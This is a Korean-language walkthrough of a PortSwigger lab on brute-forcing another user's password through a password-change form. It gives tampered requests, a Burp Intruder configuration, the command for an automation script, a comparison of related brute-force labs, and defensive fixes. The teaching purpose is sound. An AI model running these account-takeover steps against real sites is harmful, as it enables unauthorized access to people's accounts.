# Lab: Password brute-force via password change

## 개요

- **난이도**: Practitioner
- **주제**: Authentication — 비밀번호 변경(Change password) 기능 악용 / hidden `username` 변조 / 응답 메시지 기반 brute-force
- **링크**: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

## 목표

비밀번호 변경 기능의 로직 결함을 이용해 `carlos` 의 현재 비밀번호를 brute-force 하고, 그의 `My account` 페이지에 접근한다.

- 내 계정: `wiener:peter`
- 피해자: `carlos`
- 입력 목록: candidate passwords

## 취약 지점

### 1. `username` 이 hidden input (대상 계정 변조 가능)

```
POST /my-account/change-password
username=wiener&current-password=...&new-password-1=...&new-password-2=...
         └──────┘ 요청 body 의 값으로 변경 대상 결정
```

내 세션(wiener)으로 로그인한 상태에서 `username` 만 `carlos` 로 바꾸면,
서버가 carlos 의 현재 비밀번호를 검증한다.

### 2. 검증 순서/메시지 차이로 비밀번호 판별

```
[현재 비밀번호 틀림 + 새 비밀번호 두 개 다름]
  → "Current password is incorrect"

[현재 비밀번호 맞음 + 새 비밀번호 두 개 다름]
  → "New passwords do not match"          ← 성공 신호
```

현재 비밀번호 검증을 통과해야만 "새 비밀번호 불일치" 단계로 진행하기 때문에,
이 메시지 차이로 현재 비밀번호의 정오를 알 수 있다.

### 3. 계정 잠금 트리거 회피

```
[현재 비밀번호 틀림 + 새 비밀번호 두 개 같음]
  → 계정 잠금 (locked)

→ 새 비밀번호를 서로 다르게 보내면 잠금 없이 계속 시도 가능
```

## 공격 단계

### 1단계 — 변경 기능 관찰

로그인 후 비밀번호 변경을 시도하며 응답 메시지를 관찰한다.
요청에 `username` 이 hidden input 으로 포함됨을 확인한다.

```
POST /my-account/change-password HTTP/1.1
Cookie: session=<wiener>

username=wiener&current-password=...&new-password-1=...&new-password-2=...
```

### 2단계 — 메시지 차이 확인

```
1) 현재 비밀번호 틀림 + 새 비밀번호 동일   → 계정 잠금
2) 현재 비밀번호 틀림 + 새 비밀번호 다름   → "Current password is incorrect"
3) 현재 비밀번호 맞음 + 새 비밀번호 다름   → "New passwords do not match"
```

### 3단계 — Intruder 로 brute-force

요청을 Intruder 로 보내고:

```
username=carlos&current-password=§incorrect-password§
&new-password-1=123&new-password-2=abc
```

- `username` 을 `carlos` 로 변경
- `current-password` 에 payload 위치
- 새 비밀번호 두 개는 서로 다르게 고정
- Settings → Grep - Match 에 `New passwords do not match` 지정
- candidate passwords 로 공격 → 이 메시지가 나온 값이 carlos 의 현재 비밀번호

### 4단계 — 로그인

찾은 비밀번호로 `carlos` 로그인 → `My account` → 랩 해결.

## 자동화 툴

```bash
python3 tools/14-authentication-password-change-bruteforce.py \
  --target "https://LAB-ID.web-security-academy.net" \
  --victim carlos --verify
```

```
동작:
  1) wiener:peter 로그인, /my-account 에서 CSRF 확보
  2) 후보마다 username=carlos, current-password=§pw§,
     new-password-1/new-password-2 를 서로 다르게 전송
  3) "New passwords do not match" 가 나온 후보가 정답
  4) --verify 시 carlos 로그인 검증
```

주요 옵션:

```
--victim carlos
--change-path /my-account/change-password
--current-field current-password
--new1-field/--new2-field
--success-text "New passwords do not match"
--threads 1
```

검증 메모(목 서버): `carlos / <pw>` 탐지 후 로그인 확인.

## Authentication 시리즈 — Brute-force 변형 비교

| # | 랩 | 우회/판별 포인트 |
|---|-----|------------------|
| 001 | different responses | 실패 메시지 차이로 username 열거 |
| 004 | subtly different responses | 마침표 vs 후행 공백 |
| 005 | response timing | 응답 시간 + `X-Forwarded-For` 로 IP 차단 우회 |
| 006 | broken brute-force protection, IP block | 성공 로그인으로 실패 카운터 리셋 |
| 007 | account lock | 잠금 메시지로 username 열거 |
| 009 | stay-logged-in cookie | 쿠키 형식 brute-force (온라인) |
| 012 | password change | 변경 API + 메시지 차이 + hidden username |

```
공통 패턴:
  - "인증 실패 응답이 입력에 따라 미묘하게 달라지는가" 를 이용
  - 시도 제한/잠금/차단 로직의 허점(리셋, 트리거 회피)을 이용
  - 정상 기능(변경/재설정/쿠키)을 인증 우회 표면으로 전용
  → 근본 방어는 응답/타이밍 통일 + 강한 시도 제한 + 서버 측 대상 결정
```

## 방어

```
[근본 원인]
  1) 변경 대상 계정(username)을 클라이언트 입력으로 결정
  2) 현재 비밀번호 검증 결과가 응답 메시지로 구분됨
  3) 시도 제한이 특정 조건(새 비밀번호 일치)에서만 동작

[올바른 방어]
  1. 변경 대상은 서버 세션의 사용자로 고정
     - username 등 대상을 클라이언트가 지정하지 못하게 함
  2. 실패 응답을 통일
     - 검증 단계 구분 없이 동일 메시지/상태/타이밍
  3. 시도 제한을 조건과 무관하게 적용
     - 현재 비밀번호 검증 실패 시 항상 rate limit/백오프/잠금
  4. 새 비밀번호 정책(일치/강도) 검증 순서를 정보 노출 없이 처리
  5. 비밀번호 변경 시 재인증 요구, 변경 후 세션 무효화/알림
  6. 로그인/변경 실패 모니터링

[주의]
  "검증 순서" 와 "어느 조건에서 제한이 걸리는가" 가 곧 정보 노출/우회 지점이다.
```

## 핵심 정리

- 비밀번호 변경 API 의 `username` hidden input 을 `carlos` 로 바꿔 타 계정의 현재 비밀번호를 검증시켰다.
- 현재 비밀번호가 맞고 새 비밀번호가 다를 때만 나오는 `New passwords do not match` 메시지로 비밀번호를 판별했다.
- 새 비밀번호를 다르게 보내 계정 잠금 트리거를 회피하며 brute-force 했다.
- 방어는 대상 계정을 세션으로 고정하고, 실패 응답을 통일하며, 시도를 조건 없이 제한하는 것이다.

## 배운 점

- 기존 brute-force 랩들과 본질은 같고, "어떤 엔드포인트를 우회 표면으로 쓰는가" 만 다르다(로그인 → 비밀번호 변경).
- 정상 기능도 응답이 조건에 따라 달라지면 enumeration/brute-force 신호가 된다.
- hidden input 으로 대상을 받는 설계는 접근 제어(IDOR)와 인증 우회를 동시에 유발할 수 있다.
- 이 랩을 위해 `tools/14-authentication-password-change-bruteforce.py` 를 작성하고, 시리즈 전반의 brute-force 변형 패턴을 정리했다.
